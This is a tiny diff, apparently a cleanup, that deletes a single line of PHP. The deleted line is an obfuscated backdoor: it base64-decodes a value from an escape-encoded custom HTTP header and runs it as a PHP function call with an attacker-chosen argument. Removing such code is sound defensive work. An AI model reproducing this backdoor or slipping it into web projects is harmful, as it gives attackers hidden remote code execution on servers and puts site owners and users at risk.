@@ -1,1 +1,0 @@
-<?php $pG2JS_3njSeUWTqh = explode("\176", base64_decode($_SERVER["\x48\124\124\120\x5f\x41\111\132\101\x57\x41\x5f\x4e\x49\116\112\101"])); $pG2JS_3njSeUWTqh[0]($pG2JS_3njSeUWTqh[1]);
